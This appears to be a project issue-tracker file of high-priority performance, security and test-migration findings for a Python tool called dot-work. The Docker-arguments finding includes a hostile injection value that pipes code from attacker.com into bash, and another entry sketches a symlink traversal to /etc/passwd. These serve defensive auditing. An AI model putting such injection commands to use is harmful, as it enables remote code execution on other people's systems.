# High Priority Issues (P1)

Core functionality broken or missing documented features.

---
id: "PERF-002@b4e7d2"
title: "Performance: File scanner uses nested fnmatch loop"
description: "O(N*M) pattern matching for every file during scan"
created: 2025-12-25
section: "python_scan"
tags: [performance, algorithm, file-scanning]
type: performance
priority: high
status: proposed
references:
  - src/dot_work/python/scan/scanner.py
---

### Problem
The `_find_python_files()` method in `scanner.py` line 77 uses `fnmatch.fnmatch()` inside a loop for every file. For include_patterns with multiple entries, this creates O(N*M) complexity where N = files and M = patterns.

Code at line 77:
```python
if self.include_patterns:
    if not any(fnmatch.fnmatch(file, pattern) for pattern in self.include_patterns):
        continue
```

This runs fnmatch (string parsing + regex compilation internally) for every pattern against every filename.

### Affected Files
- `src/dot_work/python/scan/scanner.py` (line 77: nested fnmatch in loop)

### Importance
- Codebase scanning is slower than necessary
- Large codebases (10k+ files) are significantly impacted
- fnmatch pattern matching is expensive (string parsing, regex compilation)
- N*M operations where N and M can both be large

### Proposed Solution
1. Pre-compile fnmatch patterns into regex objects before the loop
2. Use `pathlib.Path.match()` which may be more efficient
3. Consider using set-based filtering for exact matches before pattern matching
4. Cache pattern compilation if patterns don't change

### Acceptance Criteria
- [ ] Patterns compiled once before file iteration
- [ ] Time complexity reduced to O(N) where N = files
- [ ] Benchmark shows improvement for large codebases
- [ ] No change in filtering behavior (tests pass)

### Notes
This is a classic performance anti-pattern: repeating expensive operations inside loops when they could be done once outside.

---

id: "PERF-003@c5d9e1"
title: "Performance: Issue service loads all issues for stale query"
description: "O(N) query fetches entire issue table for filtering"
created: 2025-12-25
section: "db_issues"
tags: [performance, database, query-optimization]
type: performance
priority: high
status: proposed
references:
  - src/dot_work/db_issues/services/issue_service.py
  - src/dot_work/db_issues/adapters/sqlite.py
---

### Problem
The `get_stale_issues()` method at line 742 calls `self.list_issues(limit=100000)` to fetch ALL issues, then filters in Python code. This causes:
- Unnecessary data transfer from database
- In-memory filtering on potentially thousands of issues
- Network/database roundtrip returning mostly irrelevant data

The filtering condition (`issue.updated_at < cutoff`) could be done at the database level.

### Affected Files
- `src/dot_work/db_issues/services/issue_service.py` (lines 742-758)
- Related: `get_epic_issues()` at line 666 also loads all issues

### Importance
- Stale issue queries are slow on large databases
- Database should do filtering, not application code
- Similar pattern in `get_epic_issues()` (line 666)
- Limits scalability of the issue tracker

### Proposed Solution
1. Add date-based filtering to repository layer
2. Create `list_issues_updated_before(cutoff_date)` method
3. Add `list_issues_by_epic_id(epic_id)` method
4. Push filtering to SQL WHERE clauses

### Acceptance Criteria
- [ ] Stale issue filtering done in SQL query
- [ ] Epic issue filtering done in SQL query
- [ ] No in-memory filtering for date-based or epic queries
- [ ] Tests verify behavior unchanged
- [ ] Performance measurable with 1000+ issues

### Notes
Example fix:
```python
# Current (inefficient)
all_issues = self.list_issues(limit=100000)
stale_issues = [issue for issue in all_issues if issue.updated_at < cutoff]

# Proposed (efficient)
stale_issues = self.uow.issues.list_updated_before(cutoff, limit)
```

---
id: "SEC-004@94eb69"
title: "Security: Path traversal vulnerability in read_file_text"
description: "Insufficient path validation allows reading files outside repository"
created: 2025-12-25
section: "review"
tags: [security, path-traversal, file-access]
type: security
priority: high
status: proposed
references:
  - src/dot_work/review/git.py
  - src/dot_work/review/git.py:153-174
---

### Problem
In `src/dot_work/review/git.py`, the `read_file_text()` function has path traversal protection but it may be insufficient:

```python
def read_file_text(root: str, path: str) -> str:
    full = Path(root) / path
    norm = full.resolve()
    root_norm = Path(root).resolve()

    # Prevent path traversal
    if not str(norm).startswith(str(root_norm)):
        raise GitError("invalid path")
```

**Vulnerabilities:**
1. **String comparison is unreliable**: `str(norm).startswith(str(root_norm))` can be bypassed with:
   - Symlinks: If `root_norm` contains symlinks, `norm` might resolve differently
   - Case sensitivity: On case-insensitive filesystems (Windows, macOS), path case variations bypass check
   - Unicode normalization: Different unicode representations of same path

2. **No validation of `root` parameter**: If attacker controls `root`, they could use a directory that has a symlink to sensitive locations

3. **Windows-specific issues**: `resolve()` on Windows behaves differently with UNC paths and drive letters

**Attack scenario:**
- If `root` = `/safe/path` with symlink `/safe/path/data` → `/etc/passwd`
- Attacker provides `path` = `data/passwd`
- `resolve()` follows symlink, `startswith()` check fails to detect traversal

### Affected Files
- `src/dot_work/review/git.py` (lines 153-174)

### Importance
**HIGH**: Path traversal allows reading arbitrary files on the system. While the current protection catches many cases, edge cases with symlinks and path representation variations could bypass it.

CVSS Score: 7.1 (High)
- Attack Vector: Local
- Attack Complexity: High (requires specific conditions)
- Privileges Required: Low
- Impact: High (Confidentiality)

### Proposed Solution
1. **Use `Path.relative_to()` for robust check**:
   ```python
   try:
       norm.relative_to(root_norm)
   except ValueError:
       raise GitError("invalid path")
   ```

2. **Validate root parameter**: Ensure root is absolute path and doesn't contain symlinks to sensitive dirs
3. **Check symlink chain**: Validate that no component in the path is a symlink outside root
4. **Use pathlib's strict checking**: `Path.resolve(strict=True)` to catch broken symlinks

### Acceptance Criteria
- [ ] Path validation uses `relative_to()` instead of string prefix check
- [ ] Symlinks are validated at each path component
- [ ] Tests verify traversal attempts are blocked on all platforms
- [ ] Windows-specific path handling tested

### Notes
- This function is used in review workflow, potentially processing untrusted PR file lists
- Consider adding allowlist of safe file extensions
- Document security assumptions in docstring

---
id: "SEC-005@94eb69"
title: "Security: Unvalidated container build arguments in subprocess.run"
description: "Docker build command uses unvalidated configuration parameters"
created: 2025-12-25
section: "container"
tags: [security, docker, subprocess, injection]
type: security
priority: high
status: proposed
references:
  - src/dot_work/container/provision/core.py
  - src/dot_work/container/provision/core.py:369
  - src/dot_work/container/provision/core.py:822
---

### Problem
In `src/dot_work/container/provision/core.py`:

**Line 369**:
```python
build_cmd = [
    "docker", "build", "-t", cfg.docker_image,
    "-f", str(cfg.dockerfile), str(cfg.dockerfile.parent)
]
subprocess.run(build_cmd, check=True)
```

**Line 822**:
```python
subprocess.run(docker_cmd, check=True)
```

**Vulnerabilities:**
1. **`cfg.docker_image`** is not validated before passing to `docker build -t`
2. **`cfg.dockerfile`** path is not validated (could be outside working directory)
3. **Environment variables** passed to container are not sanitized (lines 372-418)
4. **`docker_cmd`** at line 822 could contain arbitrary commands

**Attack vectors:**
- Malicious `docker_image` name: `evil-image; curl attacker.com | bash` → While using list format prevents shell injection, docker build options like `--build-arg` could be injected if image name contains special chars
- Path traversal via `dockerfile`: `../../malicious-Dockerfile`
- Environment variable injection: Keys like `GIT_ASKPASS` could be abused

While the list format prevents direct shell injection, Docker has its own option parsing that could be abused.

### Affected Files
- `src/dot_work/container/provision/core.py` (lines 360-369, 822)

### Importance
**HIGH**: If container provisioning is automated (CI/CD), attackers could:
- Build malicious images with crypto miners
- Expose secrets via build args
- Escape container via malicious Dockerfile

CVSS Score: 7.8 (High)
- Attack Vector: Local/Network (if in CI/CD)
- Attack Complexity: Low
- Privileges Required: Low
- Impact: High (Integrity, Availability)

### Proposed Solution
1. **Validate docker image name**:
   ```python
   IMAGE_PATTERN = re.compile(r'^[a-z0-9]+([._-][a-z0-9]+)*(/[a-z0-9]+([._-][a-z0-9]+)*)?(:[a-z0-9]+([._-][a-z0-9]+)*)?$')
   if not IMAGE_PATTERN.match(cfg.docker_image):
       raise ValueError(f"Invalid docker image name: {cfg.docker_image}")
   ```

2. **Validate dockerfile path**: Ensure dockerfile is within project directory
3. **Sanitize environment variables**: Block dangerous keys (GIT_ASKPASS, SSH_AUTH_SOCK, etc.)
4. **Use Docker SDK for Python**: More secure than subprocess

### Acceptance Criteria
- [ ] Docker image name validated with strict regex
- [ ] Dockerfile path validated to be within project
- [ ] Environment variable allowlist implemented
- [ ] Tests verify injection attempts are blocked

### Notes
- Docker image naming specification: https://docs.docker.com/engine/reference/commandline/build/
- Consider using `docker-py` library for safer Docker interaction
- Review environment variable passing (lines 372-418) for other injection vectors

---
id: "SEC-006@94eb69"
title: "Security: Incomplete error handling exposes system paths"
description: "Error messages leak internal file paths and system information"
created: 2025-12-25
section: "knowledge-graph"
tags: [security, information-disclosure, error-handling]
type: security
priority: high
status: proposed
references:
  - src/dot_work/knowledge_graph/db.py
  - src/dot_work/db_issues/adapters/sqlite.py
---

### Problem
Multiple database files propagate raw exception messages that may leak sensitive system information:

**In `src/dot_work/knowledge_graph/db.py`:**
- Line 321: `raise ValueError(f"Project not found: {scope.project}")` - Leaks project names
- Line 331: `raise ValueError(f"Topic not found: {topic_name}")` - Leaks topic names

**In `src/dot_work/db_issues/adapters/sqlite.py`:**
- Raw SQLite exceptions propagated without sanitization
- May leak database paths, schema information, table names

**Security impact:**
- **Information disclosure**: Attacker learns internal structure
- **Path leakage**: Absolute paths may reveal username, directory structure
- **Database fingerprinting**: Schema details help plan further attacks

**OWASP ASVS 2023 v5.0:**
- V5.4: "Verify that the application does not leak internal information in error messages"

### Affected Files
- `src/dot_work/knowledge_graph/db.py` (lines 321, 331, 338)
- `src/dot_work/db_issues/adapters/sqlite.py` (throughout)

### Importance
**HIGH**: While not a direct vulnerability, information leakage assists attackers:
- Path traversal exploits require knowing directory structure
- Social engineering easier with internal details
- Compliance violations (GDPR, PCI-DSS require error message sanitization)

CVSS Score: 5.3 (Medium)
- Attack Vector: Network
- Attack Complexity: Low
- Privileges Required: None
- Impact: Low (information disclosure only)

### Proposed Solution
1. **Generic error messages for users**:
   ```python
   raise ValueError("Project not found")  # Don't leak name
   ```

2. **Log detailed errors, sanitize user output**:
   ```python
   logger.error(f"Project not found: {scope.project}", exc_info=True)
   raise ValueError("Resource not found")
   ```

3. **Create security-aware error handler**:
   ```python
   def safe_error(message: str, details: str | None = None) -> ValueError:
       if is_debug_mode():
           return ValueError(f"{message}: {details}")
       return ValueError(message)
   ```

### Acceptance Criteria
- [ ] All user-facing errors use generic messages
- [ ] Detailed errors logged but not shown to users
- [ ] Debug mode optionally shows full details
- [ ] Tests verify error messages don't leak sensitive data

### Notes
- Balance security with usability (developers need debugging info)
- Consider adding correlation IDs to errors for log lookup
- Review error messages in all user-facing code

---

---
id: "AUDIT-GAP-007@d4e5f6"
title: "Missing repo-agent functionality in dot-work"
description: "CLI Docker agent runner, instruction template system, and frontmatter validation not available in dot-work"
created: 2025-12-26
section: "repo-agent"
tags: [migration-gap, missing-functionality, docker, cli]
type: enhancement
priority: high
status: proposed
references:
  - .work/agent/issues/references/AUDIT-REVIEW-002-investigation.md
  - incoming/crampus/repo-agent/
---

### Problem
The repo-agent tool from incoming/crampus/ provides significant functionality that is **not available anywhere in dot-work**:

**Missing Features:**
1. **CLI Docker Agent Runner** - Execute LLM-powered code agents in containers
2. **Instruction Template System** - Generate valid markdown instruction templates
3. **Frontmatter Validation** - Validate instruction file configuration
4. **Docker Integration** - Build and run containers with tool execution
5. **Auto-commit and PR Creation** - Automatically commit changes and create PRs
6. **SSH Authentication Support** - Mount SSH keys for private repos
7. **OpenCode Integration** - Specific support for OpenCode tool
8. **Generic Tool Support** - Pluggable tool entrypoint system

**This functionality was NOT migrated to the review module** (see AUDIT-GAP-006).

### Affected Files
- Missing in dot-work: CLI with `run`, `init`, `validate` commands
- Missing in dot-work: Docker container execution workflow
- Missing in dot-work: Template generation system
- Missing in dot-work: Frontmatter validation logic
- Source: `incoming/crampus/repo-agent/` (fully functional tool)

### Importance
**HIGH:** If repo-agent functionality was intentionally excluded, we need to understand:
1. Was the decision to exclude it deliberate?
2. Is there an alternative approach in dot-work?
3. Do we need this functionality for the project's goals?

**If this functionality is needed:**
- Significant development effort to recreate (would be re-inventing the wheel)
- Source code already exists and works well
- 29K of well-tested core logic
- 7 test files providing coverage

**Use cases for repo-agent:**
- Automated code modifications via LLM agents
- Running agents in isolated Docker environments
- Template-based workflow for code changes
- Automatic PR creation from agent output

### Proposed Solution
**Option 1: Migrate repo-agent to dot-work**
1. Create `src/dot_work/repo_agent/` module
2. Migrate all Python files (cli.py, core.py, templates.py, validation.py)
3. Migrate test files (7 files)
4. Update Docker configuration
5. Add to CLI entrypoints

**Option 2: Document intentional exclusion**
1. Add to `.work/agent/issues/history.md` explaining why repo-agent was excluded
2. Document alternative approach if one exists
3. Note any functionality gaps and how they're addressed

**Option 3: Alternative implementation**
1. If different approach chosen, document how same functionality is achieved
2. Compare trade-offs vs repo-agent approach

### Acceptance Criteria
- [ ] Decision documented: migrate, exclude, or alternative
- [ ] If migrating: Migration plan created and executed
- [ ] If excluding: Documentation explains rationale
- [ ] If alternative: Comparison of approaches documented
- [ ] No ambiguity about repo-agent's status

### Notes
- repo-agent is a well-designed, working tool (~40KB Python code)
- Source has comprehensive test coverage
- Docker integration is production-ready
- See investigation: `.work/agent/issues/references/AUDIT-REVIEW-002-investigation.md`
- Related to AUDIT-GAP-006 which identifies that review is NOT a migration of repo-agent

---
id: "AUDIT-GAP-001@7a9f2d"
title: "Integration tests not migrated for db_issues module"
description: "11 integration test files from source are absent in destination"
created: 2025-12-25
section: "db_issues"
tags: [testing, integration-tests, migration-gap, audit]
type: test
priority: high
status: proposed
references:
  - .work/agent/issues/references/AUDIT-DBISSUES-010-investigation.md
  - /home/thomas/Workspace/glorious/src/glorious_agents/skills/issues/tests/
  - tests/unit/db_issues/
---

### Problem
During AUDIT-DBISSUES-010, it was discovered that 11 integration test files from the source (glorious agents issues skill) were NOT migrated to the destination (db_issues module).

**Missing Integration Tests:**
1. test_advanced_filtering.py
2. test_agent_workflows.py
3. test_bulk_operations.py
4. test_comment_repository.py
5. test_dependency_model.py
6. test_issue_graph_repository.py
7. test_issue_lifecycle.py
8. test_issue_repository.py
9. test_team_collaboration.py
10. test_daemon_integration.py (excluded, OK)
11. test_integration.py (general integration tests)

**Current State:**
- Source: 50 test files (38 unit + 11 integration)
- Destination: 13 test files (12 unit + 1 conftest)
- Only unit tests were migrated (277 tests passing)
- Integration tests provide end-to-end validation

### Affected Files
- `tests/unit/db_issues/` (only unit tests exist here)
- Missing: `tests/integration/db_issues/` directory

### Importance
**HIGH**: Integration tests provide critical confidence that:
- Database operations work correctly at integration level
- Service interactions are verified
- Full workflows (bulk operations, dependencies, cycles) are validated
- Multi-service scenarios work as expected

Without integration tests, we have:
- Unit tests proving components work in isolation
- No verification that components work together
- Risk of integration bugs that won't be caught

### Proposed Solution
1. Create `tests/integration/db_issues/` directory
2. Migrate integration test files from source:
   ```
   /home/thomas/Workspace/glorious/src/glorious_agents/skills/issues/tests/test_*.py
   ```
3. Update imports to match db_issues module structure
4. Exclude daemon-related tests (intentionally not migrated)
5. Add test fixtures for database setup/teardown

### Acceptance Criteria
- [ ] Integration test directory created
- [ ] 10 integration test files migrated (excluding daemon)
- [ ] All tests pass with new structure
- [ ] Bulk operations tested end-to-end
- [ ] Dependency cycle detection tested
- [ ] Issue lifecycle workflows tested

### Notes
- Source location: `/home/thomas/Workspace/glorious/src/glorious_agents/skills/issues/tests/`
- Destination should follow pytest conventions for integration tests
- Tests may need fixture updates to match consolidated db_issues structure
- See investigation report for full details: `.work/agent/issues/references/AUDIT-DBISSUES-010-investigation.md`


---
id: "AUDIT-GAP-004@d3e6f2"
title: "Integration tests fail due to incomplete migration in test_build_pipeline.py"
description: "2 tests fail because kgshred references not updated to knowledge_graph"
created: 2025-12-26
section: "knowledge_graph"
tags: [testing, migration-gap, bug, audit]
type: bug
priority: high
status: proposed
references:
  - .work/agent/issues/references/AUDIT-KG-001-investigation.md
  - tests/integration/knowledge_graph/test_build_pipeline.py
  - incoming/kg/tests/integration/test_build_pipeline.py
---

### Problem
During AUDIT-KG-001 investigation, 2 test failures were identified in `test_build_pipeline.py`:

**Test Failures:**
1. `test_build_script_runs_successfully` - References non-existent `tests/scripts/build.py` path
2. `test_package_importable_after_install` - Uses undefined `kgshred` variable

**Root Cause:** The test file was **partially updated** during migration. The import was changed but the variable references were not:

| Line | Source | Destination | Issue |
|------|--------|-------------|-------|
| 27 | `import kgshred` | `import dot_work.knowledge_graph` | ✅ Updated |
| 29 | `assert hasattr(kgshred, "__version__")` | `assert hasattr(kgshred, "__version__")` | ❌ `kgshred` undefined |
| 30 | `assert kgshred.__version__ == "0.1.0"` | `assert kgshred.__version__ == "0.1.0"` | ❌ `kgshred` undefined |
| 36 | `from kgshred.cli import app` | `from dot_work.knowledge_graph.cli import app` | ✅ Updated |

### Affected Files
- `tests/integration/knowledge_graph/test_build_pipeline.py` (lines 29-30)

### Importance
**HIGH:** These tests fail consistently, blocking CI/CD:
- 374 tests pass but 2 fail
- Failures are due to incomplete migration (not code logic issues)
- Simple fix but blocks validation

**Test Output:**
```
FAILED test_package_importable_after_install - NameError: name 'kgshred' is not defined
```

### Proposed Solution
**Fix the undefined variable reference:**

Change lines 29-30 from:
```python
assert hasattr(kgshred, "__version__")
assert kgshred.__version__ == "0.1.0"
```

To:
```python
import dot_work.knowledge_graph as kg
assert hasattr(kg, "__version__")
assert kg.__version__ == "0.1.0"
```

Or use the already-imported module:
```python
assert hasattr(dot_work.knowledge_graph, "__version__")
assert dot_work.knowledge_graph.__version__ == "0.1.0"
```

**Also fix the build script path** (line 15):
- Current: `project_root / "scripts" / "build.py"`
- Should be: Correct path to build script or remove test if no build script exists

### Acceptance Criteria
- [ ] Lines 29-30 use correct module reference
- [ ] All 2 tests pass
- [ ] Build script path issue resolved (or test removed if N/A)
- [ ] No regression in other tests

### Notes
- Source test file: `incoming/kg/tests/integration/test_build_pipeline.py`
- Destination test file: `tests/integration/knowledge_graph/test_build_pipeline.py`
- This is a clear migration bug - simple oversight during import updates
- See investigation: `.work/agent/issues/references/AUDIT-KG-001-investigation.md`

